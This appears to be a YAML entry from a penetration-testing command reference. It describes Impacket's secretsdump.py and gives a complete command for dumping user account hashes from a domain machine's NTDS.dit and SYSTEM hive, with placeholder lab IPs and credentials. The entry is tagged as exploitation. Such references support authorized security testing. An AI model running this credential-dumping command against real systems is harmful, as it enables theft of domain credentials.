      document: "---\ndescription: |\n  Impacket's secretsdump.py will perform various techniques to dump\
        \ secrets from the remote machine without executing any agent. Techniques include reading SAM\
        \ and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and kerberos keys,\
        \ and dumping NTDS.dit. The following command will attempt to use the specified machines NTDS.dit\
        \ and system file to extract the user account hashes associated with that machine.\n\n  Command\
        \ Reference:\n\n  \tTarget IP: 10.10.10.2\n\n  \tDomain Controller: 10.10.10.1\n\n  \tDomain:\
        \ test.local\n\n  \tUsername: john\n\n  \tPassword: password123\n\ncommand: |\n  python3 secretsdump.py\
        \ -ntds C:\\Windows\\NTDS\\ntds.dit -system C:\\Windows\\System32\\Config\\system -dc-ip 10.10.10.1\
        \ test.local/john:password123@10.10.10.2\nitems:\n  - Password\n  - Username\nservices:\n  - Kerberos\n\
        \  - NTLM\nOS:\n  - Linux\n  - Windows\nattack_types:\n  - Exploitation\nreferences:\n  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py\n\
